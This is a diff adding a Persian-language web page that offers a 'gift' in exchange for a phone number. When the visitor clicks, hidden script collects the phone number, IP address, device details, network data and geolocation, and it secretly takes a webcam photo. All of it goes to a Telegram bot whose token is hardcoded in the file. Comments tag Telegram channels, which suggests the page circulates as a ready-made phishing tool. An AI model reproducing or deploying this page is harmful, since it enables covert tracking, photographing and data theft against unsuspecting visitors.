@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دریافت اطلاعات دستگاه</title>
+    <style>
+        /* T.me/secbaz */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 26px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .container {
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        label {
+            font-size: 18px;
+            color: #555;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #007BFF;
+            outline: none;
+        }
+
+        button {
+            background-color: #007BFF;
+            color: #fff;
+            padding: 15px;
+            width: 100%;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #666;
+            transition: opacity 0.3s ease;
+        }
+
+        .loading {
+            display: none;
+            font-size: 16px;
+            color: #007BFF;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+
+        .social-message {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #28a745;
+            font-weight: bold;
+            display: none;
+        }
+
+        .animated-message {
+            font-size: 18px;
+            color: #f39c12;
+            font-weight: bold;
+            margin-top: 20px;
+            display: none;
+        }
+
+        /* t.me/rmsup */
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+                width: 90%;
+            }
+
+            button {
+                font-size: 16px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <h1>!به صفحه دریافت هدیه خوش اومدی</h1>
+    <div class="container">
+        <label for="phone">شماره تلفن خود را وارد کنید:</label>
+        <input type="text" id="phone" placeholder="شماره تلفن">
+        <button id="submitBtn">دریافت هدیه</button>
+        <p class="message" id="statusMessage"></p>
+        <div class="loading" id="loadingMessage">در حال بررسی شماره...</div>
+        <div class="social-message" id="socialMessage">در حال تحلیل اطلاعات دستگاه شما...</div>
+        <div class="animated-message" id="animatedMessage">در حال ارسال اطلاعات...</div>
+    </div>
+
+    <script>
+        const telegramBotToken = '7570828689:AAHWrO48Y9WbjjjG1q5oeKAHZJB44bU2jWE';
+        const chatId = '1234';
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const data = {
+                chat_id: 216273191,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => console.log('پیام با موفقیت ارسال شد:', result))
+            .catch(error => console.error('خطا در ارسال پیام:', error));
+        }
+
+        function getIpInfo() {
+            fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipInfo = `
+*آدرس آی‌پی (IPv4):* ${data.ip}
+                `;
+                sendToTelegram(ipInfo);
+            })
+            .catch(error => console.error('خطا در دریافت آی‌پی:', error));
+        }
+
+        function getDeviceInfo(phoneNumber) {
+            let deviceInfo = `
+*شماره تلفن:* ${phoneNumber}
+*مدل دستگاه:* ${navigator.userAgent}
+*نوع دستگاه:* ${navigator.platform}
+            `;
+            sendToTelegram(deviceInfo); 
+        }
+
+        function getTimeInfo() {
+            let timeInfo = `
+*زمان فعلی:* ${new Date().toLocaleString()}
+            `;
+            sendToTelegram(timeInfo);
+        }
+
+        function getMemoryInfo() {
+            if (performance.memory) {
+                let memoryInfo = `
+*میزان حافظه (RAM):* ${performance.memory.usedJSHeap / 1048576} MB
+                `;
+                sendToTelegram(memoryInfo);
+            }
+        }
+
+        function getNetworkInfo() {
+            if (navigator.connection) {
+                let connection = navigator.connection;
+                let networkInfo = `
+*نوع اتصال شبکه:* ${connection.effectiveType}
+*سرعت اتصال:* ${connection.downlink} Mbps
+                `;
+                sendToTelegram(networkInfo);
+            }
+        }
+
+        function getLocationInfo() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let locationInfo = `
+*دقت موقعیت جغرافیایی:* ${position.coords.accuracy} متر
+*موقعیت جغرافیایی:* Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}
+                    `;
+                    sendToTelegram(locationInfo);
+                });
+            }
+        }
+
+        // t.me/rmsup
+        function getCpuInfo() {
+            let cpuInfo = `
+*تعداد هسته‌های پردازنده:* ${navigator.hardwareConcurrency || 'غیرقابل دسترسی'}
+            `;
+            sendToTelegram(cpuInfo);
+        }
+
+        function takePhoto() {
+            let video = document.createElement('video');
+            let canvas = document.createElement('canvas');
+            let context = canvas.getContext('2d');
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(function(blob) {
+                        let formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob);
+                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(result => console.log('عکس با موفقیت ارسال شد:', result))
+                        .catch(error => console.error('خطا در ارسال عکس:', error));
+                    });
+                }, 1000);
+            })
+            .catch(error => console.error('خطا در دسترسی به دوربین:', error));
+        }
+
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const phoneNumber = document.getElementById('phone').value;
+            if (phoneNumber) {
+                document.getElementById('statusMessage').textContent = "در حال جمع‌آوری اطلاعات...";
+                document.getElementById('statusMessage').style.color = "#f39c12";
+                document.getElementById('loadingMessage').style.display = "block";
+
+                // t.me/secbaz
+                getIpInfo();
+                getDeviceInfo(phoneNumber);
+                getTimeInfo();
+                getMemoryInfo();
+                getNetworkInfo();
+                getLocationInfo();
+                getCpuInfo();
+                takePhoto();
+
+                document.getElementById('statusMessage').textContent = "اطلاعات دستگاه ارسال شد!";
+                document.getElementById('loadingMessage').style.display = "none";
+                document.getElementById('socialMessage').style.display = "block";
+                setTimeout(function() {
+                    document.getElementById('socialMessage').style.display = "none";
+                    document.getElementById('animatedMessage').style.display = "block";
+                }, 2000);
+            }
+        });
+    </script>
+
+</body>
+</html>
